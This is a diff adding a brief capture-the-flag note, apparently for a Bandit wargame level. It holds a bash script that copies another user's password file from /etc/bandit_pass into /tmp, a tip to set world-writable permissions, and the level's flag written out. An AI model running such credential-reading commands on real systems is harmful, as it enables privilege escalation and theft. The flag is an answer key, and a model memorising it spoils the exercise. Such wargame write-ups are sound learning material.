@@ -1,0 +1,12 @@
+# Creating your own shellscript
+
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24  >> /tmp/tmp.sOrQHW1XdC 
+
+#END
+
+make sure to set chmod 777 ALSO ON THE TMP DIR
+
+flag:
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
